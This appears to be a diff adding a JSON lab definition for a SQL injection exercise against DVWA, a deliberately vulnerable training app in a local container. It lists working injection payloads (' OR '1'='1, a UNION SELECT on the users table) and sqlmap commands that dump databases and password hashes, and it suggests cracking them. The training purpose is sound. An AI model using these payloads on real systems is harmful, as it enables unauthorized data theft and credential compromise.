@@ -1,0 +1,69 @@
+{
+  "id": "sqli-dvwa",
+  "name": "SQL Injection (DVWA)",
+  "difficulty": "medium",
+  "container": "dvwa",
+  "ip": "172.20.0.10",
+  "port": 80,
+  "short_description": "Learn SQL injection basics and extract database contents.",
+  "description": "SQL injection is one of the most common web vulnerabilities. By injecting SQL commands into input fields, attackers can bypass authentication, extract data, or even take over the server. DVWA provides a safe environment to practice these techniques.",
+  "steps": [
+    {
+      "title": "Access DVWA in browser",
+      "command": "curl -I http://172.20.0.10",
+      "explanation": "First, verify DVWA is running. Then open http://localhost:8080 in your browser.",
+      "expected": "HTTP/1.1 302 Found (redirect to login)"
+    },
+    {
+      "title": "Login to DVWA",
+      "explanation": "Open http://localhost:8080 in your browser. Login with admin / password",
+      "expected": "You see the DVWA dashboard"
+    },
+    {
+      "title": "Set security to Low",
+      "explanation": "Click 'DVWA Security' in the left menu. Set Security Level to 'Low' and click Submit. This removes protections so you can learn the basics.",
+      "expected": "Security level shows 'Low'"
+    },
+    {
+      "title": "Go to SQL Injection page",
+      "explanation": "Click 'SQL Injection' in the left menu. You'll see a User ID input field.",
+      "expected": "A form asking for User ID"
+    },
+    {
+      "title": "Test for SQL injection",
+      "command": "1'",
+      "explanation": "Enter this in the User ID field and submit. The single quote breaks the SQL query.",
+      "expected": "You see a SQL error message - this confirms SQLi vulnerability!"
+    },
+    {
+      "title": "Extract all users",
+      "command": "' OR '1'='1",
+      "explanation": "This makes the WHERE clause always true, returning all users.",
+      "expected": "You see multiple users listed (admin, gordonb, etc.)"
+    },
+    {
+      "title": "Use UNION to extract data",
+      "command": "' UNION SELECT user, password FROM users-- -",
+      "explanation": "UNION combines results from another query. We're extracting usernames and password hashes.",
+      "expected": "You see usernames and MD5 password hashes"
+    },
+    {
+      "title": "Use SQLMap for automation",
+      "command": "sqlmap -u 'http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=YOUR_SESSION_ID;security=low' --dbs",
+      "explanation": "SQLMap automates SQL injection. Replace YOUR_SESSION_ID with your actual session cookie from the browser (F12 > Application > Cookies).",
+      "expected": "SQLMap finds the vulnerability and lists databases"
+    },
+    {
+      "title": "Dump the users table",
+      "command": "sqlmap -u 'http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=YOUR_SESSION_ID;security=low' -D dvwa -T users --dump",
+      "explanation": "This extracts all data from the users table, including password hashes.",
+      "expected": "Full user table with cracked passwords"
+    }
+  ],
+  "success_criteria": "You can extract usernames and password hashes using manual SQLi or SQLMap. Bonus: crack the hashes!",
+  "next_steps": [
+    "Try 'Medium' security level (requires different techniques)",
+    "Use John to crack the MD5 hashes",
+    "Explore Command Injection in DVWA"
+  ]
+}
